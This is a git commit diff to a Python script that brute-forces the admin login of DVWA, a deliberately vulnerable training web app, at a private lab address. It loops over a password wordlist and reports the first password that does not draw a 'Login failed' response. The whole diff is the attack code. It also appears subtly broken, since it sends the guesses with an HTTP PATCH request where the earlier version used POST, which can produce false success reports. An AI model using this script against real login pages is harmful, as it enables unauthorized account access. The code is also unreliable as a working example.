4431833d2e80c76dd0703125b8326f77cbf0d56b
Hem Parekh <54116609+Hem1700@users.noreply.github.com>
2021-05-19 10:51:32 +0530

    Using a list of password

--- login_guess.py
+++ login_guess.py
@@ -1,6 +1,17 @@
 import requests
 
 target_url = "http://10.0.2.4/dvwa/login.php"
-login_info_dict ={"username": "admin", "password": "password", "Login": "submit"}
-response = requests.post(target_url , data= login_info_dict)
-print(response.content)
+login_info_dict ={"username": "admin", "password": "", "Login": "submit"}
+
+
+with open("C:\\Users\\dharm\\PycharmProjects\\crawler\\password.txt", "r") as password_list:
+        for line in password_list:
+            word = line.strip()
+            login_info_dict["password"] = word
+            response = requests.patch(target_url , data= login_info_dict)
+            if "Login failed" not in response.content.decode():
+                print("[+] Got the password -->" + word)
+                exit()
+
+
+print("[+] Reached the end of line")                
